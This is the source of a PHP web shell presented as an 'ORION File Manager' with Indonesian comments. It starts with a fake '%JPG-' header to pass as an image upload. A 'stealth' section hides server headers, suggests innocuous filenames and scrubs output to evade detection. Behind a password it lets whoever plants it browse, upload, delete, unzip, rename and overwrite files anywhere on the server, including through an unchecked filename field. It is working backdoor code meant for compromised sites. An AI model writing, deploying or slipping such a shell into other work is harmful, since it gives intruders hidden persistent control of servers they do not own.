%JPG-
<?php
// ==============================================
// KONFIGURASI AWAL - EDIT BAGIAN INI SAJA
// ==============================================
$secret_password_hash = '$2y$10$Aba9B0YhABlM/02U9gwCcedrWbYzASDr8vz5AV5.OaZbWwqSXqZle'; // Ganti dengan hash password Anda
$stealth_mode = true; // true untuk mode stealth, false untuk normal
$login_timeout = 3600; // Waktu timeout sesi dalam detik (1 jam)

// ==============================================
// FUNGSI STEALTH
// ==============================================
if ($stealth_mode) {
    // Hilangkan header server
    header_remove('X-Powered-By');
    
    // Nama file bisa diganti dengan nama yang tidak mencurigakan
    $stealth_filename = 'index.php'; // atau nama lain seperti 'system-check.php'
    
    // Randomize output untuk menghindari deteksi pola
    ob_start(function($buffer) {
        $patterns = [
            '/\s+/' => ' ',
            '/<!--.*?-->/s' => '',
            '/\n\s*\n/' => "\n"
        ];
        $buffer = preg_replace(array_keys($patterns), array_values($patterns), $buffer);
        return $buffer;
    });
}

// ==============================================
// SISTEM AUTENTIKASI
// ==============================================
session_start();

// Generate hash password dengan: password_hash('password_anda', PASSWORD_DEFAULT)
// Contoh: echo password_hash('rahasia123', PASSWORD_DEFAULT);

// Cek jika sudah login
$is_authenticated = false;
if (isset($_SESSION['fm_auth']) && $_SESSION['fm_auth'] === true) {
    if (isset($_SESSION['fm_last_activity']) && (time() - $_SESSION['fm_last_activity'] < $login_timeout)) {
        $is_authenticated = true;
        $_SESSION['fm_last_activity'] = time(); // Perbarui waktu aktivitas
    } else {
        session_destroy(); // Session timeout
    }
}

// Proses login
if (isset($_POST['login_password'])) {
    if (password_verify($_POST['login_password'], $secret_password_hash)) {
        $_SESSION['fm_auth'] = true;
        $_SESSION['fm_last_activity'] = time();
        $_SESSION['fm_ip'] = $_SERVER['REMOTE_ADDR'];
        $is_authenticated = true;
        
        // Redirect untuk menghilangkan parameter POST
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        // Delay untuk mencegah brute force
        sleep(2);
        $login_error = "Akses ditolak";
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Jika belum login, tampilkan form login
if (!$is_authenticated) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>System Access</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                margin: 0;
            }
            .login-box {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                width: 300px;
                text-align: center;
            }
            .login-box h2 {
                color: white;
                margin-bottom: 30px;
            }
            .login-box input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: none;
                border-radius: 5px;
                background: rgba(255, 255, 255, 0.2);
                color: white;
                font-size: 16px;
                box-sizing: border-box;
            }
            .login-box input::placeholder {
                color: rgba(255, 255, 255, 0.7);
            }
            .login-box button {
                width: 100%;
                padding: 12px;
                background: linear-gradient(45deg, #667eea, #764ba2);
                border: none;
                border-radius: 5px;
                color: white;
                font-size: 16px;
                cursor: pointer;
                margin-top: 10px;
            }
            .login-box button:hover {
                background: linear-gradient(45deg, #764ba2, #667eea);
            }
            .error {
                color: #ff6b6b;
                margin-top: 10px;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔒 System Access</h2>
            <form method="post">
                <input type="password" name="login_password" placeholder="Enter access key" required>
                <button type="submit">Authenticate</button>
                <?php if (isset($login_error)) echo "<div class='error'>$login_error</div>"; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==============================================
// FILE MANAGER (HANYA DIAKSES SETELAH LOGIN)
// ==============================================

$activeDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$activeDir = realpath($activeDir);

// Handle file/folder removal
if (!empty($_GET['remove'])) {
    $target = realpath($activeDir . '/' . basename($_GET['remove']));
    if ($target && is_file($target)) {
        unlink($target);
        echo "File '" . basename($target) . "' dihapus.<br>";
    } elseif ($target && is_dir($target)) {
        rmdir($target);
        echo "Folder '" . basename($target) . "' dihapus.<br>";
    }
}

// Handle folder creation
if (!empty($_POST['create_dir'])) {
    $newDir = $activeDir . '/' . basename($_POST['create_dir']);
    if (!is_dir($newDir)) {
        mkdir($newDir);
    }
}

// Handle file upload
if (!empty($_FILES['upload_file'])) {
    $fileName = basename($_FILES['upload_file']['name']);
    $targetPath = $activeDir . '/' . $fileName;
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetPath);
}

// Handle file editing
if (!empty($_POST['file_content']) && !empty($_POST['filename'])) {
    file_put_contents($_POST['filename'], $_POST['file_content']);
    echo "<div class='notice'>File disimpan.</div>";
}

// Handle unzip
if (!empty($_POST['unzip_file'])) {
    $zipPath = realpath($activeDir . '/' . basename($_POST['unzip_file']));
    if ($zipPath && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($zipPath) === TRUE) {
            $zip->extractTo($activeDir);
            $zip->close();
            echo "<div class='notice'>File '" . basename($zipPath) . "' berhasil di-unzip.</div>";
        } else {
            echo "<div class='notice'>Gagal membuka file zip.</div>";
        }
    } else {
        echo "<div class='notice'>File zip tidak ditemukan atau bukan file zip.</div>";
    }
}

// Handle rename
if (!empty($_POST['rename_old']) && !empty($_POST['rename_new'])) {
    $oldPath = realpath($activeDir . '/' . basename($_POST['rename_old']));
    $newPath = $activeDir . '/' . basename($_POST['rename_new']);
    if ($oldPath && file_exists($oldPath)) {
        if (!file_exists($newPath)) {
            if (rename($oldPath, $newPath)) {
                echo "<div class='notice'>Berhasil rename '" . basename($oldPath) . "' menjadi '" . basename($newPath) . "'</div>";
            } else {
                echo "<div class='notice'>Gagal melakukan rename.</div>";
            }
        } else {
            echo "<div class='notice'>Nama baru sudah ada.</div>";
        }
    } else {
        echo "<div class='notice'>File atau folder yang ingin di-rename tidak ditemukan.</div>";
    }
}

// Fungsi untuk format ukuran file agar mudah dibaca
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>ORION File Manager</title>
    <style>
        body { font-family: Consolas, monospace; background: #111; color: #eee; padding: 20px; }
        a { color: #3cf; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { max-width: 1000px; margin: auto; }
        h2 { color: #6cf; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 6px 10px; border-bottom: 1px solid #444; }
        th { background: #222; }
        td { vertical-align: middle; }
        form { margin-top: 15px; }
        input[type="text"], input[type="file"], textarea {
            width: 100%; padding: 8px; background: #222; color: #fff; border: 1px solid #444; border-radius: 4px;
        }
        input[type="submit"] {
            background: #3cf; color: #000; border: none; padding: 8px 16px; margin-top: 5px;
            cursor: pointer; border-radius: 4px;
        }
        input[type="submit"]:hover { background: #5df; }
        .file-edit { margin-top: 30px; background: #1a1a1a; padding: 20px; border-radius: 8px; }
        .notice { background: #0f0; color: #000; padding: 5px; margin-top: 10px; border-radius: 4px; }
        .rename-form { margin-top: 30px; background: #1a1a1a; padding: 15px; border-radius: 8px; }
        label { display: block; margin-top: 10px; }
        .actions a { margin-right: 10px; color: #f66; }
        .actions a.edit { color: #6cf; }
        .logout-btn { 
            float: right; 
            background: #f44336; 
            color: white; 
            padding: 8px 16px; 
            border-radius: 4px; 
            text-decoration: none;
        }
        .logout-btn:hover { background: #d32f2f; }
    </style>
</head>
<body>
<div class="container">
    <a href="?logout=true" class="logout-btn">Logout</a>
    <h2>📁 Direktori Aktif: <?php echo htmlspecialchars($activeDir); ?></h2>

    <table>
        <thead>
            <tr>
                <th>Nama File/Folder</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Writable</th>
                <th>Aksi</th>
            </tr>
        </thead>
        <tbody>
        <?php
        $parent = dirname($activeDir);
        if ($parent !== $activeDir) {
            echo "<tr><td><a href='?dir=" . urlencode($parent) . "'>[.. Naik Folder]</a></td><td>-</td><td>-</td><td>-</td><td></td></tr>";
        }

        foreach (scandir($activeDir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $fullPath = $activeDir . '/' . $item;
            $size = '-';
            $lastMod = date("Y-m-d H:i:s", filemtime($fullPath));
            $writable = is_writable($fullPath) ? 'Yes' : 'No';

            if (is_dir($fullPath)) {
                $size = '-';
                echo "<tr>
                        <td>📁 <a href='?dir=" . urlencode(realpath($fullPath)) . "'>$item</a></td>
                        <td>$size</td>
                        <td>$lastMod</td>
                        <td>$writable</td>
                        <td class='actions'>
                            <a href='?dir=" . urlencode($activeDir) . "&remove=" . urlencode($item) . "' onclick='return confirm(\"Yakin ingin hapus folder $item?\")'>hapus</a>
                        </td>
                    </tr>";
            } else {
                $size = formatSize(filesize($fullPath));
                echo "<tr>
                        <td>📄 $item</td>
                        <td>$size</td>
                        <td>$lastMod</td>
                        <td>$writable</td>
                        <td class='actions'>
                            <a href='?dir=" . urlencode($activeDir) . "&remove=" . urlencode($item) . "' onclick='return confirm(\"Yakin ingin hapus file $item?\")'>hapus</a>
                            <a class='edit' href='?dir=" . urlencode($activeDir) . "&edit=" . urlencode($item) . "'>edit</a>
                        </td>
                    </tr>";
            }
        }
        ?>
        </tbody>
    </table>

    <h3>📤 Upload File</h3>
    <form method="post" enctype="multipart/form-data" action="?dir=<?php echo urlencode($activeDir); ?>">
        <input type="file" name="upload_file" required>
        <input type="submit" value="Upload">
    </form>

    <h3>📂 Buat Folder Baru</h3>
    <form method="post" action="?dir=<?php echo urlencode($activeDir); ?>">
        <input type="text" name="create_dir" placeholder="Nama folder" required>
        <input type="submit" value="Buat">
    </form>

    <h3>🗜️ Unzip File ZIP</h3>
    <form method="post" action="?dir=<?php echo urlencode($activeDir); ?>">
        <input type="text" name="unzip_file" placeholder="Nama file .zip" required>
        <input type="submit" value="Unzip">
    </form>

    <h3>✏️ Rename File/Folder</h3>
    <form method="post" class="rename-form" action="?dir=<?php echo urlencode($activeDir); ?>">
        <label for="rename_old">Nama Lama (file/folder):</label>
        <input type="text" id="rename_old" name="rename_old" placeholder="Nama file/folder lama" required>
        <label for="rename_new">Nama Baru:</label>
        <input type="text" id="rename_new" name="rename_new" placeholder="Nama baru" required>
        <input type="submit" value="Rename">
    </form>

    <?php
    if (!empty($_GET['edit'])):
        $editFile = $activeDir . '/' . basename($_GET['edit']);
        if (is_file($editFile)):
            $content = htmlspecialchars(file_get_contents($editFile));
    ?>
        <div class="file-edit">
            <h3>✏️ Edit File: <?php echo basename($editFile); ?></h3>
            <form method="post" action="?dir=<?php echo urlencode($activeDir); ?>">
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                <textarea name="file_content" rows="20"><?php echo $content; ?></textarea>
                <input type="submit" value="💾 Simpan">
            </form>
        </div>
    <?php
        endif;
    endif;
    ?>
</div>
</body>
</html>